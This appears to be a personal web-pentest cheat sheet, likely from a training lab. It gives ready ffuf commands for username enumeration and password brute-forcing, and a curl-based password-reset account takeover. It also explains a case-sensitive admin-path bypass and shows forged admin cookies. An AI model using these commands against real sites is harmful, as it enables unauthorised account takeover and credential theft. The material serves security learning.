# Hack users and passwords

#### Account username research

1. Create list of usernames based on eg. errors on website
2. Find endpoint where login is possible
3. Use FFUF to bypass:
```
$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" \
-H "Content-Type: application/x-www-form-urlencoded" -u http://<domain_name>/customers/signup -mr "username already exists"
```
* -w  selects the file's location on the computer that contains the list of usernames that we're going to check exists. 
* -X  specifies the request method, this will be a GET request by default, but it is a POST request in this example. 
* -d  specifies the data that we are going to send. In this example fields: username, email, password and cpassword. 
      NOTE: In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request. 
* -H  used for adding additional headers to the request. In this instance, we're setting the Content-Type to the webserver knows we are sending form data. 
* -u  specifies the URL we are making the request to, and finally
* -mr the text on the page we are looking for to validate we've found a valid username.

To save only FUZZ outup in file:
$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" \
-H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists" -s | tee output.txt
```

4. Run FFUF with specific user and password 
```
$ ffuf -w output.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST \ 
-d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://<domain_name>/customers/login -fc 200
```

#### Account takeover
1. Create account with email in company domain
2. Run curl to reset password for other user, using your own email:
```
$ curl 'http://<domain_name>/customers/reset?email=<name>%40<email>' \
-H 'Content-Type: application/x-www-form-urlencoded' -d 'username=<name>&email=<new_email>'
```

---

## PHP code example

This PHP code checks to see whether the start of the path the client is visiting begins with /admin. 
Then further checks are made to see whether the client is, in fact, an admin. 
If the page doesn't begin with /admin, the page is shown to the client.
```
if( url.substr(0,6) === '/admin') {
    # Code to check user is an admin
} else {
    # View Page
}
```
Three equals signs (===) means it's looking for an exact match on the string, so it's case sesitive. 
The code presents a logic flaw because an unauthenticated user can bypass the authentication checks.

---

## Cookies

1. Check Set-Cookie header when interacting with website.

2. Check status:
```
$ curl http://<domain_name>/cookie-test
```

3. Send cookies:
```
$ curl -H "Cookie: logged_in=true; admin=true" http://<domain_name>/cookie-test
```

When cookie is a hash value use:
* Hashing decryptor -> https://crackstation.net/








